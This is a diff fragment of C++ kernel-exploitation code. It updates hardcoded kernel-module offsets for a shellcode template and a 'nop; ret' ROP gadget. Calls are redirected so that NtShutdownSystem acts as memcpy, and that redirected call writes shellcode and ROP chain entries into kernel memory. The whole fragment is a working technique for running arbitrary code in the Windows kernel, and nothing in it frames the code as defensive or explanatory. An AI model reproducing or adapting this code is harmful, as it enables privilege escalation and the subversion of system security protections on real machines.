@@ -40,14 +40,14 @@ int main()
     };
 
     *(void**)(ShellcodeTemplate + 2) = StackAllocation;
-    *(void**)(ShellcodeTemplate + 12) = (void*)(Driver::GetKernelModuleBase() + 0x256048);
+    *(void**)(ShellcodeTemplate + 12) = (void*)(Driver::GetKernelModuleBase() + 0x3890c4);
 
     KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
     reinterpret_cast<void*(*)(void*, void*, size_t)>(NtShutdownSystem)(ShellcodeAllocation, &ShellcodeTemplate, sizeof(ShellcodeTemplate));
     KernelCaller.DisableRedirectByName("NtShutdownSystem");
 
     // Write rop gadgets
-    void* RopGadgetTest = (void*)(Driver::GetKernelModuleBase() + 0x227581); // nop; ret; gadget
+    void* RopGadgetTest = (void*)(Driver::GetKernelModuleBase() + 0x3357b3); // nop; ret; gadget
     KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(StackAllocation, &RopGadgetTest, sizeof(void*));
     KernelCaller.DisableRedirectByName("NtShutdownSystem");
